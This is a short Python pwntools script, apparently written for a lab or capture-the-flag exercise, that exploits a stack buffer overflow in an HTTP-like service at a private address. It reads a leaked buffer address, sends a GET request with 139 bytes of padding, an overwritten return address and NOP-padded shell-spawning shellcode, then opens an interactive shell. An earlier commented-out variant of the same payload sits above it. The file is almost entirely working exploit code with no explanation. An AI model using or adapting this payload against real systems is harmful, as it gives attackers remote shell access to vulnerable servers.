# from pwn import *

# HOST,PORT = "192.168.246.145",20000
# p = remote(HOST,PORT)

# p.recvuntil('at ')
# buf_addr = int(p.recvline().decode().strip('\n:-)'),16)+50

# shellcode = asm(shellcraft.sh())

# payload = flat(
#     "GET ",
#     shellcode.rjust(139,b"\x90"),
#     buf_addr
# )
# payload += flat(
#     " HTTP/1.1"
# )

# p.sendline(payload)
# print(p.clean().decode('latin-1'))

from pwn import *

HOST,PORT = "192.168.246.145",20000
p = remote(HOST,PORT)

p.recvuntil('at ')
buf_addr = int(p.recvline().decode().strip('\n:-)'),16)+157
print(buf_addr)

shellcode = asm(shellcraft.sh()).rjust(50,b"\x90")

payload = flat(
    "GET ",
    "A"*139,
    buf_addr,
    " HTTP/1.1",
    shellcode
)

p.sendline(payload)
print(p.clean().decode('latin-1'))
p.interactive()
